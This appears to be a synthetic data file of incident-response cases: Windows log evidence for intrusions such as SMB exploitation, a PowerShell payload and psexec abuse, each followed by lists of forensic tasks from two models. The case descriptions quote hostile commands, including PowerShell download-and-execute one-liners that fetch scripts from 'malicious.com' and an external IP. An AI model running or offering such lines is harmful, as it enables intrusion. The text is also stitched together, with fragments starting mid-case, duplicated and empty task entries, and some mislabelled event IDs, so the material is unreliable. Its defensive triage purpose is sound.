Description: Review Active Directory logs to pinpoint when the “adversary” account was created, who created it, its default group memberships, and whether it was locally or domain-registered. Compare these details against baseline account templates to determine if the account was legitimately provisioned or maliciously introduced.

Task #2
Title: Retrieve and analyze the PowerShell script PrivEsc.ps1
Description: Locate the script at “C:\Scripts\privEsc.ps1”, calculate its SHA256 hash, and perform static analysis to enumerate any malicious commands, obfuscation techniques, or embedded payloads. Cross‑reference the script's contents and hash against known malicious repositories to assess its threat level.

Task #3
Title: Assess Scheduled Task persistence via ElevateAdminTask
Description: Examine the properties of the “ElevateAdminTask” scheduled task, verify its trigger conditions (logon), action (net localgroup command), user context (SYSTEM), and stealth techniques employed. Search other workstations in the domain for identical scheduled tasks to uncover lateral persistence mechanisms.

Task #4
Title: Examine SMB file copy activity of x64.exe
Description: Pull SMB transaction logs for the copy of x64.exe from \\FileSrv\public to the local Public\Temp directory. Compute its checksum, conduct dynamic analysis to confirm malicious functionality, and check threat intelligence feeds for known associations with this file.

Task #5
Title: Investigate outbound TLS connection to 203.0.113.45
Description: Identify the parent process of ID 4128, capture TLS handshake details (SNI, certificates), and inspect outgoing DNS or HTTP requests for suspected command‑and‑control indicators. Verify the connection against firewall logs to confirm outbound traffic patterns and timing.

Task #6
Title: Validate Mimikatz credential dumping activity
Description: Correlate Mimikatz execution timestamp with Security Event ID 4663 on LSASS to confirm the process successfully obtained credential data. Use memory analysis tools to extract the hashes and plaintext credentials from LSASS, and verify the Mimikatz source file and version against known malicious signatures.

Task #7
Title: Review permission change on C:\ProgramData\secure.cfg
Description: Compare file ACLs before and after the change at 02:17:10 UTC to confirm that “adversary” was granted FullControl. Assess whether this modification could provide an additional persistence or privilege escalation surface and whether secure.cfg contains any tampered configuration data.

Task #8
Title: Confirm legitimacy of remote RDP session from 198.51.100.25
Description: Cross‑reference Event ID 4624 (RemoteInteractive login) with firewall VPN logs for the same IP address/device. Validate whether this workstation belonged to an authorized support team, verify the GPO status for that device, and check for any suspicious activity originating from it post‑login.

Task #9
Title: Audit UAC disabling via PrivEscPolicy GPO
Description: Inspect the “PrivEscPolicy” Group Policy Object for its creation/modification timestamps, linked Organizational Units, and scope of application. Verify that registry key HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA was set to 0 and check administrative event logs for GPO creation or delegation account used.

Task #10
Title: Search for lateral movement indicators from “adversary”
Description: Scan Server-01 event logs for additional authentication attempts (4768, 4769), domain trust changes, and other GPO applications after 02:18:00 UTC. Check for SMB or RDP connections initiated by “adversary” to other servers, network shares mounted, or net use commands executed for lateral propagation.

Task #11
Title: Acquire a volatile memory snapshot from Server‑01

case_title: Suspicious inbound traffic to internal web server indicates attempted exploitation of known CVE‑2023‑45678 via remote code execution
case_description:
- SIEM alert ID 21045 triggered on web server WS01 at 2026‑03‑07 14:32:07 UTC.  
- Firewall log: inbound TCP from source IP 203.0.113.195 to destination 10.10.0.5 port 80, 3 packets totaling 4,500 bytes.  
- IDS alert: Snort rule 5001 “Possible exploitation attempt for CVE‑2023‑45678” triggered 2026‑03‑07 14:31:59 UTC.  
- HTTP request line captured: `POST /admin/login HTTP/1.1` with User‑Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) CVE‑2023‑45678‑Exploit`.  
- EDR flagged new process `C:\Temp\exploit_payload.exe` started 2026‑03‑07 14:32:02 UTC with cmd.exe command line `cmd.exe /c "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/exploit.ps1')"` .  
- File hash of the downloaded payload: SHA256 d4b6e7c9b5f12c3aaf8f6e5d2b4c1f7835e0c9b23d6a1f4e2a5b6c7d8e9f0a1b.  
- Sysmon event: process creation for `exploit_payload.exe` (PID 5423) spawned `explorer.exe` (PID 5424) at 2026‑03‑07 14:32:05 UTC.  
- Registry event: Event ID 4900 in Windows Security Center log indicating unauthorized change to key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.  
- Account used: `DOMAIN\jane` logged in at 2026‑03‑07 14:31:45 UTC.  
- Threat intelligence match: Source IP 203.0.113.195 listed as known malicious IP associated with APT‑CyberCrack.

case_title: Suspicious Active Directory enumeration activity detected from workstation 10.0.0.42
case_description:
- Sysmon Event ID 1 – Process creation: 10.0.0.42 (WIN10S1) launched powershell.exe with command line `powershell.exe -Command "Get-ADComputer -Filter * | Select-Object Name"` as user Domain\rogueUser at 2026-03-10T09:32:14Z.  
- Sysmon Event ID 10 – Network connection: 10.0.0.42 → 10.170.0.5 on port 445 (SMB) at 2026-03-10T09:32:20Z.  
- Windows Security Event ID 4624 – Successful logon of Domain\rogueUser to WIN10S1 at 2026-03-10T09:30:43Z.  
- Windows Security Event ID 4625 – Failed SMB access attempt from Domain\evilUser to \\10.170.0.5\share at 2026-03-10T09:33:05Z, indicating enumeration activity.  
- Net API logs – WMI queries executed on hosts 10.170.0.4–10.170.0.11 within 5 minutes, collecting computer system information.  
- DNS query logs – 10.0.0.42 queried SRV records `_ldap._tcp.dc._msdcs.local` and `ldap.dc.local` at 2026-03-10T09:31:53Z.  
- Flow logs – Host 10.0.0.42 performed a TCP SYN scan against 10.170.0.0/24 for ports 1‑1024, flagged in network monitoring tool.  
- EDR behavioral indicator – Process reg.exe executed read from `HKLM\SYSTEM\CurrentControlSet\Services\ADFS\Parameters` at 2026-03-10T09:35:17Z, typical of AD data extraction attempts.  
- Security Event ID 4671 – Operation on ADSI property: `userAccountControl` for object `LDAP://CN=Users,DC=example,DC=com` performed by Domain\rogueUser at 2026-03-10T09:36:05Z.  
- Windows Security Event IDs 4656/4658 – Multiple failed attempts to map network shares (`net use * \\10.170.x.x\share /user:DOMAIN\rogueUser`) recorded, suggesting enumeration of shared resources.

case_title: Outbound SMB connection from internal host to external IP initiates possible exploitation attempt
case_description: Firewall log 2026‑03‑09 10:23:47 – src 10.0.1.15 → dst 203.0.113.78, port 445, bytes 2,097,152, action allow; IDS alert 2312 (SMB Exploit Attempt) on WIN‑DC01, 2026‑03‑09 10:23:50, severity high, src 10.0.1.15 → dst 203.0.113.78; Windows Security event ID 4625 on WIN‑DC01, 2026‑03‑09 10:23:48, failed NTLM logon attempt from 203.0.113.78 on account USERX; PowerShell transcript on WIN‑DC01, 2026‑03‑09 10:24:01, executed command “Invoke‑Expression (New‑Object Net.WebClient).DownloadString('http://203.0.113.78:80/susp.ps1');” by SYSTEM; Sysmon process creation event ID 1, 2026‑03‑09 10:24:02, PID 5872, image C:\\Windows\\system32\\svchost.exe, command line “/k \"C:\\Users\\Public\\Downloads\\susp.exe\"”, parent cmd.exe, user SYSTEM; Antivirus quarantine 2026‑03‑09 10:25:12 of file with MD5 6d1c3f2d5d8b3bcd..., type unknown; Network capture 2026‑03‑09 10:23:45‑10:24:30 shows SMB1 negotiation with unusual flags from 10.0.1.15 to 203.0.113.78; AD authentication log 2026‑03‑09 10:26:13 records credential capture attempt from 203.0.113.78 on account SAMSESSION; Vulnerability scanner report 2026‑03‑08 shows WIN‑DC01 missing patch KB5000802, CVE‑2023‑3814 (SMBv1 remote code execution) unpatched.
model_a_tasks:
Task #1  
Title: Verify patch status for SMBv1 on WIN‑DC01  
Description: Cross‑check the current Windows Update history of WIN‑DC01 to confirm whether patch KB5000802 (CVE‑2023‑3814) is installed. If the patch is missing or the system is still running SMBv1, document the risk level and plan for immediate upgrade to mitigate exploitation avenues.  

Task #2  
Title: Audit SMB protocol usage on 10.0.1.15  
Description: Run a network protocol audit on 10.0.1.15 to determine which SMB versions (v1, v2, v3) are active. Capture a fresh SMB handshake to verify whether any legacy SMBv1 traffic is still allowed and adjust host configuration or firewall rules accordingly.  

Task #3  
Title: Review the PowerShell download script (susp.ps1)  
Description: Extract the contents of the downloaded PowerShell script via the transcript, analyze its commands, URLs it contacts, and its execution paths. Check for obfuscation or malicious payloads and cross‑reference the script with known malware signatures.  

Task #4  
Title: Investigate Sysmon process creation event for susp.exe  
Description: Track the full lifecycle of the process (Parent PID, command line, network sockets). Examine the file "susp.exe" in C:\Users\Public\Downloads for its hash, signature, and any embedded commands. Verify if the process created registry run keys or scheduled tasks for persistence.  

Task #5  
Title: Analyze Windows Security event 4625 for credential reuse attempts  
Description: Correlate the failed NTLM login attempts from 203.0.113.78 with any successful logons that followed. Search for any credential escrow or token theft operations that could indicate lateral movement or privilege escalation.  

Task #6  
Title: Perform forensic analysis on the network capture  
Description: Re‑parse the 10.0.1.15 → 203.0.113.78 capture, focusing on SMB1 negotiation flags and any unusual packet patterns (e.g., library invocation, credential dumping payloads). Use a SMB forensic tool to extract any shared memory or payloads that may have been transmitted.  

Task #7  
Title: Verify the quarantined file (MD5 6d1c3f2d5d8b3bcd…)  
Description: Run the file through a sandbox environment to observe its behavior (registry alterations, persistence mechanisms, network connections). Compare the file hash against threat intelligence feeds and internal malware libraries to classify its threat level.  

Task #8  
Title: Assess AD authentication logs for credential capture  
Description: Query the AD audit logs for any SAMSESSION activities, new account creations, or changes to user rights originating from 203.0.113.78. Confirm whether the attacker managed to harvest or reuse credentials within the domain.  

Task #9  
Title: Confirm whether CVE‑2023‑3814 was successfully exploited  
Description: Check system logs and event IDs around the time of the IDS alert for signs of exploitation (e.g., elevated process creation, new admin accounts). Verify if the malware exploited the SMBv1 vulnerability to gain code execution or if the script took alternative entry points.  

Task #10  
Title: Identify and remove persistence mechanisms  
Description: Search for new scheduled tasks, registry run keys, or service entries created by the attacker. Use tools like PowerShell Get-Service and Get-ItemProperty to locate any configuration changes, then remove them and document the findings.  

Task #11  
Title: Map any outbound C2 connections from the compromised host  
Description: Inspect outbound SMB, HTTP(S), and DNS traffic from WIN‑DC01 and 10.0.1.15 for beaconing activity. Use the network capture and any IPS logs to identify repeat connections to 203.0.113.78 or other suspicious IPs.  

Task #12  
Title: Implement containment and remediation steps  
Description: Block 203.0.113.78 at the perimeter and consider blocking SMBv1 traffic network‑wide. Apply the missing KB patch, disable SMBv1 on all hosts, and update IDS/IPS rules. Reinforce user training on suspicious links and implement a stricter application whitelisting policy.  

Task #13  
Title: Conduct a broader sweep for lateral movement  
Description: Run a network endpoint detection system scan across all domain‑joined machines for evidence of lateral movement indicators (new admin accounts, malicious processes, suspicious registry keys). Correlate findings with the initial incident timeline.  

Task #14  
Title: Engage threat intelligence for 203.0.113.78  
Description: Query external threat intelligence databases for the IP 203.0.113.78 to determine if it is associated with known malicious activity, botnets, or command‑and‑control servers. Use this information to guide further investigation and potential legal reporting.  

Task #15

Description: Compile all logs, packet captures, script contents, malware samples, and system snapshots into a secure evidence bundle. Apply proper chain‑of‑c custody documentation and encrypt the package for potential legal or compliance review.

Task #2

Description: Update the firewall policy to deny SMB (port 445) connections from 10.0.1.15 to 203.0.113.78. Ensure legitimate services are not impacted and monitor for any new attempts.

Task #3
Title: Isolate internal host 10.0.1.15 for forensic imaging
Description: Disconnect the host from the network or place it in quarantine to prevent further spread. Capture a full disk image and volatile memory using a live response tool. Preserve the images on write-blocked media.

Task #4
Title: Investigate PowerShell download and execution on WIN‑DC01
Description: Review the PowerShell transcript around 10:24:01 for the Invoke‑Expression command downloading from the external IP. Correlate with known malicious PowerShell patterns and review subsequent executed commands.

Task #5

Task #7

Description: Aggregate Windows Security event ID 4625 logs for failed NTLM logon attempts from 203.0.113.78 on account USERX. Determine if attempts were brute force or part of credential dumping. Monitor for any subsequent successful login attempts.

Task #8
Title: Assess evidence of AD credential capture attempt
Description: Review authentication and logon events for SAMSESSION account activity. Verify any changes to account privileges, group membership, or ACLs that could facilitate lateral movement. Document findings and remediate if necessary.

Task #9
Title: Inspect for persistence mechanisms installed by malicious code
Description: Search for unauthorized startup entries, scheduled tasks, services, registry run keys, and WMI subscriptions created by the suspicious executable or svchost override. Remove any malicious persistence mechanisms and monitor for reappearance.

Task #10
Title: Disable SMBv1 across the domain
Description: Enforce Group Policy to remove SMBv1 support on all domain controllers and critical servers. Verify policy application with PowerShell or WMIC queries. Monitor for any compatibility issues arising from disabling SMBv1.

Task #11
Title: Perform advanced SMB traffic analysis
Description: Examine the network capture from 10:23:45 to 10:24:30 for SMB1 negotiation flags, unusual commands, and potential data exfiltration patterns. Produce a summarized trace to aid forensic context.

Task #12
Title: Search domain logs for lateral movement indicators
Description: Analyze SYSLOG, Security logs, and Netlogon events for lateral movement attempts originating from compromised hosts. Look for unusual access patterns or mapping of SMB shares on the external IP.

Task #13
Title: Update incident response playbook for SMB exploitation
Description: Document the exploitation chain involving CVE‑2023‑3814, SMBv1 usage, PowerShell download execution, and credential capture attempts. Incorporate safeguards such as disabling SMBv1, monitoring PowerShell activity, and blocking known malicious IPs.

case_title: Attempted privilege escalation via execution of malicious PowerShell script and psexec on Windows Server 2016
case_description:
– Sysmon ID 7: Process creation event showing “powershell.exe” executed with arguments “-ExecutionPolicy Bypass -File C:\Temp\payload.ps1” by user “DOMAIN\jdoe” at 2026‑03‑10 12:02:15 UTC.  
– Sysmon ID 1: Process creation event showing “C:\Windows\System32\cmd.exe” started by “psexec.exe” with arguments “-u admin -p P@ssw0rd \\\\target\C$\\Windows\\system32\\cmd.exe” at 2026‑03‑10 12:02:18 UTC.  
– Event ID 4624: Successful Logon (Type 10) for user “jdoe” on host 10.0.0.5 at 2026‑03‑10 12:02:00 UTC.  
– Event ID 4672: Special privileges assigned to new logon for user “jdoe” at 2026‑03‑10 12:02:05 UTC.  
– Event ID 4688: Creation of “cmd.exe” with image hash 1F47… and SID NT AUTHORITY\SYSTEM running under context of “psexec.exe” at 2026‑03‑10 12:02:18 UTC.  
– Sysmon ID 17: Image loaded event showing “evil.dll” loaded into “svchost.exe” at 2026‑03‑10 12:02:25 UTC.  
– EDR alert RIS‑2026‑12345: “Unusual process chain: jdoe → powershell.exe → psexec.exe → cmd.exe” flagged at 2026‑03‑10 12:02:20 UTC.  
– Network alert: Outbound HTTPS traffic from 10.0.0.5 to malicious domain “badactor.com” during 12:05‑12:07 UTC.  
– File creation event: “C:\Users\jdoe\AppData\Local\Temp\malicious.dll” created at 2026‑03‑10 12:01:50 UTC with SHA‑256 hash “ABCDEF123456…”.  
– Security‑Audit registry key added: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Elevate = “C:\Windows\System32\cmd.exe”.  
– ACL change: “malicious.dll” granted Full Control to “Everyone”.  
– Artifact: Command line “psexec.exe \\target -i -s \"C:\\Windows\\System32\\cmd.exe\"”.  
– Credential artifact: Captured credential for “admin” with password “P@ssw0rd123” stored in memory during execution.  
– Observation: The process hierarchy indicates an attempt to spawn a SYSTEM‑level process using local administrative credentials. The user “jdoe” is normally a non‑admin account, yet received administrative privileges for the session. The presence of “psexec.exe” with administrative credentials suggests credential misuse.
model_a_tasks:
Task #1  
Title: Identify malicious components in payload.ps1  
Description: Retrieve the file “C:\Temp\payload.ps1” from the victim host and review its content for suspicious code, such as credential dumping, persistence routines, or malicious command strings. Compare the script hash with known threat databases to confirm it is not a legitimate tool.

Task #2  
Title: Confirm and analyze evil.dll loaded into svchost.exe  
Description: Pull the DLL from memory (via Sysmon ID 17 or a memory‑dump tool), calculate its hash, and scan it against malware AV and reputation engines. Inspect the DLL’s behavior (e.g., hooks, API calls) to determine its purpose and whether it establishes persistence or exfiltration capabilities.

Task #3  
Title: Investigate the use of psexec.exe with admin credentials  
Description: Examine the command line used for psexec, verify that the supplied password “P@ssw0rd123” is indeed the credential obtained, and check for evidence of credential dumping or pass‑the‑hash activity. Assess whether the remote cmd.exe was executed under SYSTEM context and if it launched additional malicious agents.

Task #4  
Title: Verify jdoe’s privileged logon session  
Description: Analyze Event ID 4672 and Windows security audit logs to confirm that the “jdoe” session was granted special privileges. Determine if these privileges were assigned through a group policy, explicit assignment, or via a compromised account. Cross‑check with other logons to rule out a coincidental temporary privilege increase.

Task #5  
Title: Validate persistence via the HKLM Run registry key  
Description: Inspect the HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Elevate key pointing to “C:\Windows\System32\cmd.exe”. Confirm the command line used at startup, check for associated DLL or script loads, and determine whether this key was added maliciously or is an innocuous configuration.

Task #6  
Title: Review ACL changes to malicious.dll  
Description: Examine the ACL granted to “C:\Users\jdoe\AppData\Local\Temp\malicious.dll”, ensure that granting Full Control to Everyone is atypical for system files, and assess whether this modification enables persistence or facilitates execution by other accounts.

Task #7  
Title: Analyze outbound HTTPS traffic to badactor.com  
Description: Capture or review existing packet capture logs for the traffic period 12:05‑12:07 UTC. Identify the HTTP requests, payloads, and any data exfiltration. Cross‑reference the domain “badactor.com” with threat intelligence feeds to confirm malicious intent.

Task #8  
Title: Extract and analyze credential data from memory  
Description: Perform a memory forensic extraction focusing on the region where “admin” credentials were stored. Verify the presence of plaintext passwords, session tickets, or credential dumping artifacts and confirm whether they were reused in subsequent sessions or stored for later use.

Task #9  
Title: Determine lateral movement via psexec on the target host  
Description: Query the target server (\\target) for newly spawned processes, especially SYSTEM‑level cmd.exe instances, and inspect any installed services or scheduled tasks. Check the event logs on the target for signs of remote execution or unauthorized changes.

Task #10  
Title: Correlate all logs into a single incident timeline  
Description: Assemble Sysmon, Windows Event Log, EDR alert, network, and file‑system data into a chronological timeline. Highlight key actions (logon, PowerShell execution, psexec launch, DLL injection, outbound traffic) to clarify the attack progression and identify any missing or anomalous events.

Task #11  
Title: Search for additional persistence mechanisms on the host  
Description: Run comprehensive scans for hidden scheduled tasks, WMI subscriptions, hidden services, or LSASS modifications that may provide long‑term footholds. Use tools such as PowerShell’s Get-ScheduledTask, Get-CimInstance –ClassName Win32_Service, and Get-WmiObject for WMI event subscriptions.

Task #12  
Title: Validate the legitimacy of all third‑party utilities used  
Description: Verify the source and integrity of all utilities (psexec.exe, PowerShell binary) discovered in the logs. Check separate checksum/hash values against trusted vendor releases to ensure they were not tampered with prior to execution.

Cross‑reference PowerShell logs (Windows PowerShell Operational) and EDR behavioral alerts for any evidence of the script performing unauthorized actions, such as downloading executables or creating network connections.

Verify the execution of this key during system boot via startup folder inspection and scheduled task logs. Document the persistence mechanism and assess its impact on host integrity.

Verify the current ACL settings on the physical file at "C:\Users\jdoe\AppData\Local\Temp\malicious.dll" and assess the risk enabling unauthorized modification or execution of the DLL.

Task #8  
Title: Analyze outbound HTTPS traffic to badactor.com  
Description: Inspect network flow logs, IDS alerts, and proxy records to confirm outbound HTTPS connections from 10.0.0.5 to "badactor.com" between 12:05 and 12:07 UTC. Capture DNS queries, SSL/TLS certificate fingerprints, and any data exfiltration payloads for signature and IOC generation. Assess whether this traffic correlates temporally with the execution chain from Task #1 to Task #3.

Task #9  
Title: Validate credential misuse  
Description: Cross-reference the captured credential for "admin" with the password "P@ssw0rd123" stored in memory during psexec execution against known credential dumping artifacts (e.g., Mimikatz outputs, LSASS memory dumps). Determine whether these credentials were reused for lateral movement or data exfiltration on other hosts in the network.

Task #10  
Title: Confirm lateral movement success on target  
Description: Scrutinize the target machine's event logs for Evidence of cmd.exe execution with "-i -s" flags (indicative of SYSTEM-level remote shell). Verify whether any SYSTEM-level commands were issued post-launch and capture any resultant malicious activity, such as additional DLL loadings, registry modifications, or service creations.

case_title: Unexpected modification of the web server configuration file on CORP-WEB01
case_description:
- File path: C:\inetpub\wwwroot\config\settings.ini  
- Timestamp of modification: 2026-03-10 02:17:29 UTC  
- Modifying user: Administrator  
- Associated process: cmd.exe /c "copy C:\Temp\settings.ini C:\inetpub\wwwroot\config\settings.ini" (PID 3928, parent PID 178)  
- Windows Security Event ID 4663: File modified with FILE_WRITE_DATA access mask  
- Sysmon Event ID 11: File creation of new settings.ini (hash SHA‑256: 9b8c3a7d2e4f6c2a1234567890abcdef12345678) – old hash: <not logged>  
- Permission change: original ACL gave Read‑only to SYSTEM; new ACL grants Full Control to SYSTEM only  
- Network activity: outbound HTTPS request from CORP‑WEB01 to 198.51.100.237 at 2026-03-10 02:14:05 for file download of settings.ini  
- Windows System Event Log ID 4688 (Process Created): cmd.exe (image path: C:\Windows\system32\cmd.exe, command line: /c "copy ...")  
- Sysmon Event ID 1 (process creation) and Event ID 7 (process creation failure) for cmd.exe  
- No scheduled task entry correlating with the modification time, and no policy change recorded in Group Policy Events  
- Current file size increased from 1,042 bytes to 1,289 bytes; file attributes changed from regular file to hidden and system  
- Audit.log entry at 2026-03-10 02:17:29: “System administrator modified settings.ini on CORP‑WEB01”  
- Security Event ID 4656: Attempt to open settings.ini, followed by Event ID 4658: handle closed                                                                
- Missing: original file hash captured prior to modification, justification for the change, and any logs from the file source (198.51.100.237).
model_a_tasks:
Task #1  
Title: Acquire forensic snapshot of CORP‑WEB01  
Description: Create a bit‑forensic image of the server’s disk and export the Windows Security, System, and Sysmon logs to preserve evidence integrity. Ensure timestamps, metadata, and file attributes are captured unchanged to support later analysis.

Task #2  
Title: Compute SHA‑256 of current settings.ini  
Description: Generate the SHA‑256 hash of the modified settings.ini using a trusted hashing tool. Compare this hash with any known baseline hash to verify the extent of the modification and identify new content.

Task #3  
Title: Retrieve original settings.ini for baseline comparison  
Description: Access recent system backups, file‑system snapshots, or version‑control repositories to locate the pre‑modification settings.ini. Document differences in size, checksum, and text for forensic comparison.

Task #4  
Title: Correlate outbound HTTPS request to 198.51.100.237  
Description: Examine firewall, proxy, and system logs for the HTTPS request at 02:14:05 UTC to 198.51.100.237. Record the request URL, TLS certificate, and response payload to confirm whether the file was legitimately sourced or compromised.

Task #5  
Title: Scan downloaded settings.ini for malicious payload  
Description: Open the downloaded file in a sandboxed editor or static‑analysis tool to search for obfuscated scripts, embedded URLs, or code that could facilitate persistence or exfiltration. Compare the content with known malicious patterns.

Task #6  
Title: Reconstruct process tree for cmd.exe copy operation  
Description: Use Sysmon Event IDs 1 and 7 and Security Event ID 4688 to trace the cmd.exe invocation back to its parent process. Verify that the command execution was legitimate and not part of an automated exploitation chain.

Task #7  
Title: Review security events for anomalous attempts on settings.ini  
Description: Scrutinize Event IDs 4656 and 4658 around the modification window for repeated access or enumeration attempts. Flag any abnormal patterns such as rapid, repeated handle opens indicative of automated probing.

Task #8  
Title: Audit ACL and attribute changes of settings.ini  
Description: Compare the original and current ACL to ensure no unauthorized users were granted access; validate that the shift from Read‑only to Full Control for SYSTEM was intentional. Verify that the hidden/system attributes were applied correctly and are not a stealth tactic.

Task #9  
Title: Identify additional suspicious file or registry modifications  
Description: Search Sysmon and Windows Security logs for new file creations, modifications, or registry key changes occurring shortly before or after the modification. Look for indicators of lateral movement or persistence mechanisms.

Task #10  
Title: Run endpoint malware scan and memory analysis  
Description: Deploy the organization’s antivirus/EDR solutions to scan the server and capture a memory dump if feasible. Run YARA rules and other malware indicators against the snapshots to detect known threats related to the configuration change.

Task #11  
Title: Verify settings.ini modification against approved change logs  
Description: Cross‑reference the modification timestamp and Administrator account with change‑management tickets, approval records, or deployment logs. Confirm whether the update was authorized and documented.

Task #12  
Title: Check logon activity for Administrator account  
Description: Review Windows Event IDs 4624 and 4625 for logon events involving the Administrator account around the time of the modification. Identify any anomalous logons (remote, unusual time, or abnormal source IP) that could indicate credential compromise.

Task #13  
Title: Assess reputation and threat profile of 198.51.100.237  
Description: Query threat‑intelligence feeds, DNS history, and OSINT sources for the IP address to determine if it is linked to malicious activity, command‑and‑control infrastructure, or known adversary campaigns.

Task #14  
Title: Review IIS logs for abnormal activity post‑modification  
Description: Analyze IIS access and error logs for the period surrounding 02:14–02:17 UTC for unexpected requests, error codes, or suspicious user‑agents that may correlate with the configuration change or lateral movement.

Task #15  
Title: Document investigation findings and recommend mitigations  
Description: Compile a formal incident report summarizing the timeline, evidence, impact assessment, and root cause analysis. Include actionable remediation steps, policy updates, and any necessary user training or system hardening measures.
model_b_tasks:
Task #1  
Title: Retrieve original settings.ini via Volume Shadow Copies  
Description: Search for and extract the last Shadow Copy of C:\inetpub\wwwroot\config\settings.ini that predates 2026‑03‑10 02:17:29 UTC. Compute its SHA‑256 hash, file size, and attributes to establish a baseline for comparison with the modified file.  

Task #2  
Title: Compute hash of the recovered original settings.ini  
Description: Using a hashing utility (e.g., certutil, OpenSSL), calculate the SHA‑256 fingerprint of the Shadow Copy version. Record this value as the “original hash” to be referenced throughout the investigation.  

Task #3  
Title: Diff contents of original and modified settings.ini files  
Description: Perform a line‑by‑line comparison (e.g., diff, WinMerge) to identify all changes. Document added, removed, or altered configuration directives, noting any that introduce new script references, paths to potentially malicious binaries, or alter authentication/encryption settings.  

Task #4  
Title: Validate the outbound HTTPS request legitimacy  
Description: Capture SSL/TLS handshake metadata (cipher suite, server certificate chain, OCSP status) for the connection at 2026‑03‑10 02:14:05. Cross‑reference the certificate against a trusted list (e.g., Microsoft CA root store, publicly available CT logs) and use IP reputation services (e.g., AbuseIPDB, Cymru) to determine if 198.51.100.237 is associated with malicious activity.  

Task #5  
Title: Retrieve download logs from 198.51.100.237  
Description: If the IP belongs to a third‑party CDN or hosting provider, request web server logs covering the 2‑minute window around 02:14:05 UTC. Verify the requested URL, response status code, user agent, and byte count match expectations. Inspect MIME type and content disposition to ensure the settings.ini file was served unchanged.  

Task #6  
Title: Reconstruct the cmd.exe process hierarchy  
Description: Query Sysmon Event ID 1 logs to identify the parent process (PID 178) that spawned cmd.exe. Investigate whether this parent is a legitimate system service (e.g., ScheduledTaskHost, WMI) or an unexpected process (e.g., PowerShell, wscript.exe). Examine cmd.exe command line arguments for preceding scripts or batch files executed that may reveal the full automation chain.  

Task #7  
Title: Audit the ACL change on settings.ini  
Description: Search Security Event ID 5136 (File System Accessed/Modified) records for “Security Descriptor” modifications applied to settings.ini. Identify the account that performed the ACL change (source SID, authentication package) and the exact ACE alterations. Verify whether SYSTEM’s Full Control overrides Read‑only is justified by policy or indicative of escalation attempts.  

Task #8  
Title: Assess the significance of hidden/system attribute addition  
Description: Use the Windows Command Prompt or PowerShell to document the timing of the HIDDEN and SYSTEM attribute changes (Event ID 4670 and associated audit logs). Determine if a legitimate build or deployment script applied these attributes, or if they serve to obfuscate the file from casual users.  

Task #9  
Title: Cross‑validate Audit.log entry with Windows Security logs  
Description: Correlate the system audit log message “System administrator modified settings.ini on CORP‑WEB01” with Event IDs 4663, 4656, and 4658 to confirm consistency in user identity, process ID, and timestamps. Verify no logon spoofing or masquerading attempts (e.g., Account Being Delegated to) occurred during the period.  

Task #10  
Title: Search for hidden scheduled tasks or registry run keys referencing cmd.exe or settings.ini  
Description: Enumerate all scheduled tasks (including hidden tasks and those created by non‑standard schedules) via schtasks /query /v /fo LIST. Examine HKLM\Software\Microsoft\Windows\CurrentVersion\Run and HKCU equivalents, as well as AppInit_DLLs and RunOnce keys, for entries pointing to cmd.exe, objectionable scripts, or the modified settings.ini.  

Task #11  
Title: Verify the legitimacy of the Administrator account’s activity  
Description: Query Windows security logs for Account Logon events (Event ID 4624) involving the Administrator account within a 12‑hour window surrounding the modification. Check logon type, source IP, workstation name, and authentication package. Validate against a MemoryDB of legitimate internal administrative sessions.  

Task #12  
Title: Scan and statically analyze the modified settings.ini file  
Description: Submit the new settings.ini to multiple AV engines (e.g., CrowdStrike, VirusTotal) for signature and heuristic detection. Perform a static code review to uncover obfuscated parameters, embedded scripts, or references to suspicious domains or IP addresses. Use tools like Substrate or ilspy if the file contains compiled code segments.  

Task #13  
Title: Deploy staging environment to assess business impact of the configuration change  
Description: Initialize a non‑production copy of CORP‑WEB01, apply the modified settings.ini, and run functional tests (e.g., application endpoints, authentication flows). Monitor for redirects, unauthorized content injection, or new entry points that could facilitate exploitation. Log any deviations from expected behavior for subsequent risk assessment.  

Task #14  
Title: Determine remediation strategy – rollback vs patch implementation  
Description: Compare the modified configuration against the organization's secure baseline configuration. If malicious changes are confirmed, assess the feasibility of restoring from a known good backup snapshot taken before the incident. Validate the integrity of restored files via hash comparison, re‑apply relevant security controls, and monitor for re‑occurrence. If the change is a legitimate update, communicate findings to stakeholders, apply the configuration change to all affected servers, and document the justification for traceability.
